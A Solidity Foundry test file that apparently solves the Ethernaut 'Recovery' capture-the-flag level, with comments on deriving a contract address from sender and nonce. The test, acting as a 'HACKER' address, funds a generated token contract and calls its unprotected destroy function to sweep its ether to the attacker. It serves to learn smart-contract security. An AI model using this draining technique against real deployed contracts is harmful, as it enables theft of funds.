// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Recovery.sol";

contract RecoveryTest is Test {
    Recovery private recov;
    address private constant HACKER = address(0x3);

    function setUp() external {
        recov = new Recovery();
        vm.deal(HACKER, 5e18);
        vm.startPrank(HACKER);
    }
    // 1) We could use the block explorer 
    // 2) swe can recompute the contract address. Contract addresses are fully derived from the sender and the transaction’s nonce as:
    // last 20 bytes of hash of rlp encoding of tx.origin and tx.nonce
    // keccak256(rlp(senderAddress, nonce))[12:31]
    // There is a second way to create contracts using CREATE2 that results in a different address but this factory contract uses the standard one.
    //  Using ethers, a call to getContractAddress is enough to do the above-mentioned computation.
    // const recomputedContractAddress = ethers.utils.getContractAddress({
    //  from: challenge.address,
    //  nonce: BigNumber.from(`1`),
    // call destroy on it
    function testHack() external {
        // We act like we found the address on Etherscan
        address token = recov.generateToken("USDT", 1e6);
        (bool success, )  = token.call{value:1e15}("");
        require(success, "tx failed");
        
        (bool success1, ) = token.call(abi.encodeWithSignature("destroy(address)", payable(HACKER)));
        require(success1, "tx1 failed");
        assertEq(token.balance, 0);
    }

}